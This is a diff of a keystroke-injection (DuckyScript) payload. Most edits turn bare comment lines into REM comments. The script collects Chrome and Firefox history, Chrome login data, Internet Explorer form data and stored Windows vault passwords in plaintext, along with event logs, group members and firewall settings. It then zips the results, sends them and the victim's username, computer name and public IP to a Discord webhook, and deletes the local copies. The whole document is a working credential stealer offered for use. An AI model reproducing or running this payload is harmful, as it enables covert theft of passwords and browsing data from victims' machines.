@@ -55,15 +55,15 @@ REM Collect user and group permissions and output to a file.
 STRING $groups = 'Administrators', 'Remote Desktop Users', 'Users', 'Guests'; foreach ($group in $groups) {echo $group >> C:\temp\users_and_permissions.txt ;Get-LocalGroupMember -Group $group | Select-Object Name, PrincipalSource >> C:\temp\users_and_permissions.txt}
 ENTER
 DELAY 500
-Get Windows security event logs with ID 4624 and output to a file
+REM Get Windows security event logs with ID 4624 and output to a file
 STRING saps -NoNewWindow powershell.exe -Args "Get-WinEvent -FilterHashtable @{LogName='Security'; Id='4624'} | Select-Object TimeCreated, Id, MachineName, Message | ft -AutoSize > security_events.txt"
 ENTER
 DELAY 500
-Copy Chrome browser history to a file
+REM Copy Chrome browser history to a file
 STRING saps -NoNewWindow powershell.exe -Args "cp 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\History' ./Chrome_History"
 ENTER
 DELAY 500
-Copy Chrome browser login data to a file
+REM Copy Chrome browser login data to a file
 STRING saps -NoNewWindow powershell.exe -Args "cp 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data' ./Chrome_Logins"
 ENTER
 DELAY 500
@@ -71,33 +71,34 @@ Find recently modified documents in the user's Documents folder and output to a 
 STRING Get-ChildItem -Path 'C:\Users\*\Documents' -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -ge [DateTime]::Now.AddDays(-30)} | Select-Object FullName, LastWriteTime, Length | ft -AutoSize > recent_documents.txt
 ENTER
 DELAY 500
-Copy Firefox browser history to a file
+REM Copy Firefox browser history to a file
 STRING saps -NoNewWindow powershell.exe -Args "cp 'C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*\places.sqlite' ./firefox_history.txt"
 ENTER
-Get Internet Explorer's stored form data and output to a file
+REM Get Internet Explorer's stored form data and output to a file
 STRING Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\IntelliForms\Storage2" | Select-Object Property, Value
 ENTER
 DELAY 500
-Get all stored browser passwords and output to a file
+REM Get all stored browser passwords and output to a file
 STRING [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$vault = New-Object Windows.Security.Credentials.PasswordVault;$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password >> ./BrowserCredentials.txt
 ENTER
 DELAY 500
-List scheduled tasks and output to a file
-STRING Get-ScheduledTask | Select-Object TaskName, TaskPath, State, LastRunTime, NextRunTime, Enabled, @{Name="LastResult";Expression={$_.LastTaskResult}}, Description | Format-Table -AutoSize >> C:\temp\Scheduled_Tasks.txt}
+REM List scheduled tasks and output to a file
+STRING Get-ScheduledTask | Select-Object TaskName, TaskPath, State, LastRunTime, NextRunTime, Enabled, @{Name="LastResult";Expression={$_.LastTaskResult}}, Description | Format-Table -AutoSize >> C:\temp\Scheduled_Tasks.txt
 ENTER
 DELAY 1000
-List enabled firewall rules and output to a file
+REM List enabled firewall rules and output to a file
 STRING Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'} | Select-Object DisplayName, Enabled, Action, Direction, Protocol, LocalAddress, LocalPort, RemoteAddress, RemotePort | Format-Table -AutoSize > Firewall_Rules.txt
 ENTER
 DELAY 1000
-Get firewall profile status and output to a file
+REM Get firewall profile status and output to a file
 STRING Get-NetFirewallProfile | Select-Object Name,Enabled,DefaultInboundAction,DefaultOutboundAction | Format-Table -AutoSize > firewall_status.txt
 ENTER
 DELAY 5000
-Compress collected data files into a ZIP archive
+REM Compress collected data files into a ZIP archive
 STRING saps -NoNewWindow powershell -Args "Compress-Archive -Path *.txt -DestinationPath .\collected_data.zip"
 ENTER
 DELAY 5000
+REM Upload zip to discord and delete gathered data from local machine
 STRING $ip=curl -UseBasicParsing icanhazip.com|select Content|ft -AutoSize -Wrap -HideTableHeaders|Out-String;$url="https://discord.com/api/webhooks/WEBHOOKSTRINGHERE";$Body=@{ content = "System Overview by $env:USERNAME on $env:computername from $ip"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "f=@collected_data.zip" $url ; cd .. ; rmdir -Recurse temp
 ENTER
 DELAY 2500
